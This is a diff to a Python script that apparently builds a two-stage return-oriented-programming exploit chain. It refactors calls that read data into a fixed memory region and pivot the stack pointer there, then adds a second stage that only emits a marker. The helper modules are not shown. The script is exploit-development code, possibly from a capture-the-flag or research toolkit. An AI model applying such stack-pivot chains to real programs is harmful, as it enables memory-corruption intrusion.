@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+from exploiterRaw import exploiterRaw
 from metaGadget import *
 import argparse
 import brainfuck
@@ -96,7 +97,17 @@ repository_end = 0x00000000006C5190
 
 repository_size = repository_end - repository_start
 
-ret2_read(0, repository_start, repository_size)
-rsp_equ(repository_start)
+stage1Exploiter = exploiter()
+gen1 = metaGadetGenerator(stage1Exploiter)
 
-finalize()
+gen1.ret2_read(0, repository_start, repository_size)
+gen1.rsp_equ(repository_start)
+gen1.finalize()
+
+# Stage 2
+
+stage2Exploiter = exploiterRaw()
+gen2 = metaGadetGenerator(stage2Exploiter)
+
+gen2.marker()
+gen2.finalize()
